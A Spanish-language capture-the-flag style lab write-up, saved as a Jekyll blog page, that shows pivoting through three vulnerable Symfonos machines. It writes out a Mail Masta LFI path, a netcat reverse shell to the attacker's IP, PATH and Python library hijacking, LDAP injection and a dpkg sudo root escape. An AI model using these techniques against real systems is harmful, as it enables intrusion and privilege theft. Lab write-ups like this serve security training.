@@ -1,0 +1,401 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Not Lucken | Ciberseguridad</title>
+<meta name="description" content="Artículos sobre ciberseguridad, CTFs e investigaciones">
+
+
+
+<meta property="og:type" content="website">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Not Lucken | Ciberseguridad">
+<meta property="og:title" content="            Not Lucken      Ciberseguridad      ">
+<meta property="og:url" content="http://localhost:4000/assets/images/labPivoting/Lab/Laboratorio%20de%20Pivoting/">
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/assets/images/labPivoting/Lab/Laboratorio%20de%20Pivoting/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "notlucken",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Not Lucken | Ciberseguridad Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--default">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/videos/" >Vídeos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Contacto</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      <p>Yo me monté una red de 3 máquinas con 2 redes internas, para poder solo tener acceso a Symfonos 1 e ir pivoteando para ganar acceso a la máquina final que sería Symfonos 5.
+![[descarga (2).png]]</p>
+
+<h1 id="symfonos-1">Symfonos 1</h1>
+<h2 id="enumeración">Enumeración</h2>
+<p>Comenzamos con la Symfonos 1:
+![[Pasted image 20221025210139.png]]
+Ahí vemos que tiene redireccionamiento DNS, a symfonos.local, así que lo agregamos al /etc/hosts.
+![[Pasted image 20221025210326.png]]
+Nada raro. Vamos a ver el samba que está corriendo por los puertos 139 y 445.
+![[Pasted image 20221025210431.png]]
+Ya sabemos que hay un usuario que se llama helios.
+![[Pasted image 20221025210525.png]]
+Probemos estas contraseñas en samba con el usuario helios: 
+![[Pasted image 20221025210624.png]]
+Vemos algunos archivos, pero el que nos interesa es el todo.txt
+![[Pasted image 20221025210714.png]]
+/h3l105, probemos en la página web.
+![[Pasted image 20221025210937.png]]</p>
+<h2 id="ganando-acceso-al-sistema">Ganando acceso al Sistema</h2>
+<p>Enumeremos con wpscan:
+![[Pasted image 20221025213048.png]]
+Chan. mail masta, un plugin vulnerable a [[LFI (Local File Inclusion)]] 
+![[Pasted image 20221025213156.png]]
+Versión 1.0.0, lo cuál es vulnerable al exploit 40290.txt de searchsploit
+En el exploit nos dice que para leer archivos del servidor mediante Mail Masta, hay que ir a la siguiente ruta: 
+http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send?p/etc/passwd</p>
+
+<p>![[Pasted image 20221025213517.png]]</p>
+
+<p>Con esto, nos podemos montar un script en bash que lea el archivo que le pedimos, que lo dejo en mi github: https://github.com/luccamusomecci/privilege-escalation-linux/lfi.sh
+![[Pasted image 20221025215238.png]]</p>
+
+<p>Con esto, sabiendo que tiene Mail Masta y el puerto 25 smtp abierto, podemos hacer lo siguiente:
+![[Pasted image 20221025215333.png]]</p>
+
+<p>Para realizar un [[RCE (Remote Code Execution)]], hay que hacer lo siguiente desde telnet:
+![[Pasted image 20221025215637.png]]
+Entonces ahora, si le hacemos un curl -s -X GET …
+![[Pasted image 20221025215810.png]]
+Llegó nuestro mail con código malicioso! Ahora para saber si funcionó, hay que sumarle al final de la lína del curl un &amp;cmd=whoami:
+![[Pasted image 20221025215917.png]]
+Ahora, para ganar una reverse shell, hay que introducir el comando nc -e /bin/sh 192.168.100.104 1234
+![[Pasted image 20221025220043.png]]
+Ganamos acceso al servidor! ahora hay que hacer un [[Tratamiento de la TTY]]</p>
+<h2 id="escalada-de-privilegios-vertical">Escalada de privilegios Vertical</h2>
+<p>Ahora para la escalada de privilegios, buscamos binarios SUID:
+![[Pasted image 20221025220437.png]]
+Vemos uno raro, el /opt/statuscheck
+Si lo ejecutamos:
+![[Pasted image 20221025220925.png]]</p>
+
+<p>Obviamente como es un binario y encima el dueño es root, no lo podremos ver, pero lo que podemos hacer es pasarlo a nuestra máquina con el web server de python, para luego mirarlo con el comando strings
+![[Pasted image 20221025221245.png]]
+Usa el comando curl, así que para escalara privilegios podríamos hacer un PATH Hijacking y poner a hacer de curl el comando que nosotros quieramos.
+![[Pasted image 20221025221623.png]]
+en el ejecutable curl, pusimos chmod u+s /bin/bash, lo que nos asignaría permisos de superusuario a nuestra bash, y luego hicimos que el PATH lea primero los archivos que están en la ruta actual de trabajo, para que al ejecutar el /opt/statuscheck lea primero nuestro curl malicioso.
+![[Pasted image 20221025221756.png]]
+Escalamos privilegios!
+Ahora la parte de Pivoting.</p>
+
+<h1 id="pivoting-a-symfonos-3">Pivoting a Symfonos 3</h1>
+
+<p>subimos los binarios hostDiscovery.sh y portDiscovery.sh que están en mi github https://github.com/luccamusomecci/host-portDiscovery para descubrir hosts desde la primera máquina y luego los puertos abiertos.
+Son de fácil uso, y también de fácil edición.
+![[Pasted image 20221026012843.png]]
+El script de hostDiscovery.sh nos detectó un host distinto al de la primera máquina, y ahora veremos los puertos abiertos:
+![[Pasted image 20221026013023.png]]
+Bien, ahora para hacer un escaneo más exhaustivo hay que tirar de Nmap desde nuestra máquina, pero como incialmente nosotros no tenemos conexión directa con la segunda máquina, hay que usar chisel.
+Nos bajamos el binario portable de chisel, para luego usar el comando upx para bajarle el peso así lo podamos pasar más rápido.![[Pasted image 20221026013538.png]]
+Ahora lo subimos con el web server de Python o como vos prefieras, y luego en la máquina vulnerada lo ejecutas de la siguiente manera:
+![[Pasted image 20221026013632.png]]
+Y en tu máquina así:
+![[Pasted image 20221026013647.png]]
+Pero para que funcione hay que editar el /etc/proxychains.conf de nuestra máquina atacante:
+![[Pasted image 20221026013740.png]]
+Tienen que comentar el de socks4, porque si no va a dar problemas.
+Ahora, para probar si tenemos conexión, lanzaremos el comando <code class="language-plaintext highlighter-rouge">proxychains nmap -p80 --open -sT -T5 -v -n 10.10.0.136 2&gt;/dev/null</code>
+![[Pasted image 20221026013941.png]]
+ Tenemos conexión!</p>
+
+<h2 id="enumeración-de-symfonos-3">Enumeración de Symfonos 3</h2>
+<p>Ahora hay que proceder como en un escaneo normal, no olvidandonos de usar proxychains al inicio de cada comando.
+ Yo suelo usar este:
+ ![[Pasted image 20221026014120.png]]
+ Al querer escanear las versiones de los puertos en cuestión proxychains nos dará algunos errores, pero nada de qué preocuparse.
+ ![[Pasted image 20221026014248.png]]
+ Ahora, si queremos ver la web, obviamente no llegaremos, pero para eso hay que tirar de FoxyProxy.
+ ![[Pasted image 20221026014633.png]]
+ Así, vamos a poder llegar a la web.
+ ![[Pasted image 20221026014700.png]]
+ Si vemos el código fuente:
+ ![[Pasted image 20221026014725.png]]
+ Habla algo de underworld. Vamos a tirar de gobuster para ver si encontramos algo.
+ ![[Pasted image 20221026015058.png]]
+ Importante saber que para declarar el proxy en el gobuster no hace falta usar proxychains, solo con usar el parámetro <code class="language-plaintext highlighter-rouge">--proxy socks5://127.0.0.1:1080</code> ya estaría.</p>
+
+<p>Descubrimos que existe un directorio llamado /cgi-bin/ pero es 403. Y si eso es nuestro underworld?</p>
+<h2 id="ganando-acceso-al-sistema-1">Ganando Acceso al Sistema</h2>
+
+<p>![[Pasted image 20221026015335.png]]
+Tenemos algo!
+parece como si fuera algún comando de consola. Esto podría ser vulnerable a shellshock 
+Usaré el exploit 34766.php de searchsploit
+Y ahora para probar, me voy a mandar una shell desde Symfonos 3 a mi máquina, pero no sin 
+antes reenviar por TCP todo el tráfico entrante por el puerto 4646 de la Symfonos 1 a mi máquina mediante socat:
+![[Pasted image 20221026110329.png]]
+Entonces ahora tenemos que mandar el shellshock de la Symfonos 3 a la Symfonos 1, PERO nosotros tenemos que estar en escucha por el puerto 4646 en NUESTRA máquina.
+Es un poco enredante, pero si lo lees varias veces lo entendes.
+![[Pasted image 20221026110433.png]]
+Y llegamos a Symfonos 3!
+![[Pasted image 20221026110527.png]]</p>
+<h2 id="escalada-de-privilegios-horizontal">Escalada de Privilegios Horizontal</h2>
+<p>Si listamos /home, nos encontramos que hay otro usuario aparte de cerberus, hades.
+Subí el binario de pspy a la Symfonos 3, para listar los procesos que hay en background, y esto fue lo que vi:
+![[Pasted image 20221026111123.png]]
+Qué será eso?
+Vamos a ver.
+![[Pasted image 20221026111147.png]]
+Mmmm denegado.</p>
+
+<p>![[Pasted image 20221026111216.png]]
+Y el dueño es hades. Creo que por acá tenemos nuestra escalada de privilegios horizontal.
+Ese script le está mandando datos a FTP, y como FTP es un protocolo de datos en plano(sin encriptar) podríamos interceptarlo con tcpdump.</p>
+
+<p>El comando que use: tcpdump -w ftp.pcap -i ens33.
+Pero esto no funcionó. Estaba todo encriptado.
+Y si por ahí no está mandando nada FTP?</p>
+
+<p>Ahora probaré con la interfaz lo.</p>
+
+<p>Para pasarnos un archivo de la Symfonos 3 a nuestra máquina (Acordate que no tenemos conexión directa) Tenemos que pasarlo de máquina en máquina mediante el servidor web de Python.</p>
+
+<p>![[Pasted image 20221026113112.png]]
+Y tenemos las credenciales de Hades.
+Bien, ahora ya logeados como hades, procedemos a la escala de privilegios vertical.</p>
+<h2 id="escalada-de-privilegios-vertical-1">Escalada de Privilegios Vertical</h2>
+
+<p>En los binario SUID no hay nada interesante, pero me acordé de la carpeta ftpclient que no podíamos acceder en /opt
+![[Pasted image 20221026113410.png]]
+Como a este binario lo está corriendo Root y no lo podemos modificar, pero sí leer, podríamos fijarnos en alguna librería que esté usando para poder inyectar nuestros comandos ahí.</p>
+
+<p>![[Pasted image 20221026113540.png]]
+Está usando ftplib, así que vamos a buscarla en /usr/lib/python2.7/ftplib.py</p>
+
+<p>hacemos nuestro Library Hijacking:
+![[Pasted image 20221026113933.png]]</p>
+
+<p>Si esperamos que root ejecute el binario:</p>
+
+<p>![[Pasted image 20221026114038.png]]
+Y ya escalamos la segunda máquina!</p>
+<h1 id="pivoting-a-symfonos-5">Pivoting a Symfonos 5</h1>
+
+<p>con hostDiscovery, encontramos otra IP diferente a la nuestra.
+![[Pasted image 20221026114951.png]]</p>
+
+<p>Ahora, para hacer un Dynamic Port Forwarding desde la Symfonos 3 (que da cara a la Symfonos 5) hasta nuestra máquina, hay que hacer lo siguiente con chisel:
+![[Pasted image 20221026120612.png]]
+Esto desde la Symfonos 3 intentará conectarse a la Symfonos 1:
+![[Pasted image 20221026120705.png]]
+Así que desde la Symfonos 1 hay que redigir todo el tráfico con socat a nuestra máquina atacante.
+pero para que funcione hay que tocar ciertos parametros del proxychains.conf
+![[Pasted image 20221026120941.png]]
+![[Pasted image 20221026121001.png]]
+y si tiramos de nmap para ver si el puerto 80 de la Symfonos 5 está abierto:
+![[Pasted image 20221026121107.png]]
+Tenemos conexion!</p>
+
+<h2 id="enumeración-symfonos-5">Enumeración Symfonos 5</h2>
+<p>![[Pasted image 20221026122327.png]]
+Vamos a ver la web, acordandonos que hay que usar el FoxyProxy con el puerto 8888.</p>
+
+<p>![[Pasted image 20221026122525.png]]</p>
+
+<p>Hora de usar el gobuster.
+![[Pasted image 20221026122751.png]]
+Creo que con esto nos basta y sobra.
+Vamos a ver qué hay en /admin.php</p>
+
+<p>![[Pasted image 20221026122853.png]]
+Un Login, y me suena que esté conectado al LDAP que vemos en la enumeración.
+Vamos a ver si se puede hacer un LDAP Injection</p>
+
+<p>![[Pasted image 20221026123027.png]]</p>
+
+<p>Voy a probar con * de usuario y * de contraseña</p>
+
+<p>Y podemos acceder, y si nos vamos a la parte de portraits vemos esto:
+![[Pasted image 20221026124737.png]]
+Qué pasa si cambiamos el portrait.php por un /etc/passwd?
+![[Pasted image 20221026124834.png]]
+Bum.
+Ahora para ver el admin.php por dentro, habria que pasarlo a base64 y despues decodificarlo, tal que asi:
+![[Pasted image 20221026124932.png]]
+![[Pasted image 20221026124940.png]]</p>
+
+<p>Ahora si le echamos un ojo:
+![[Pasted image 20221026125133.png]]
+tenemos algunas credenciales de LDAP.
+si usamos nmap con el script de ldap-search:
+![[Pasted image 20221026125508.png]]</p>
+
+<p>![[Pasted image 20221026125636.png]]
+Tenemos la contraseña de zeus!
+Ahora nos conectaremos por SSH:
+![[Pasted image 20221026125731.png]]
+Estamos adentro de la 3ra máquina! 
+Solo nos queda escalar privilegios.</p>
+<h2 id="escalada-de-privilegios-de-symfonos-5">Escalada de Privilegios de Symfonos 5</h2>
+
+<p>En los binarios SUID no encontramos nada, pero al hacer un sudo -l nos encontramos esto:
+![[Pasted image 20221026125932.png]]
+Si nos vamos a gtfobins, nos encontraremos que con dpkg podemos spawnear una consola como root de la siguiente manera
+sudo dpkg -l
+!/bin/sh
+![[Pasted image 20221026130040.png]]</p>
+
+<p>![[Pasted image 20221026130121.png]]
+Esta es nuestra flag final!</p>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 notlucken</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
